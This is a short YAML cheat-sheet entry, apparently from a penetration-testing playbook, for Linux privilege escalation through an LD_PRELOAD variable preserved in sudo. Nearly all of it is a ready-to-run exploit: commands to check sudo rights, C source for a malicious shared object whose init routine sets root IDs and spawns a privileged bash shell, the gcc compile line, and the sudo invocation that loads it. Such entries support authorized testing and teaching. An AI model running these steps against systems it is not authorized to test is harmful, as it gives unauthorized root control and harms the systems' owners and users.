---
description: |
  Exploit LD_PRELOAD environment variable preserved in sudo configuration to load a malicious shared object and escalate to root.
command: |
  # Check if LD_PRELOAD is preserved in sudo:
  sudo -l
  # Look for: env_keep+=LD_PRELOAD

  # Create malicious shared object (evil.c):
  cat << 'EOF' > /tmp/evil.c
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>
  void _init() {
      unsetenv("LD_PRELOAD");
      setresuid(0,0,0);
      system("/bin/bash -p");
  }
  EOF

  # Compile the shared object:
  gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

  # Execute with LD_PRELOAD (use any program from sudo -l):
  sudo LD_PRELOAD=/tmp/evil.so program_from_sudo_l
items:
  - Shell
phase:
  - PrivEsc
target_os:
  - Linux
services: []
techniques:
  - Library_Hijack
references:
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path
  - https://gtfobins.github.io/
---
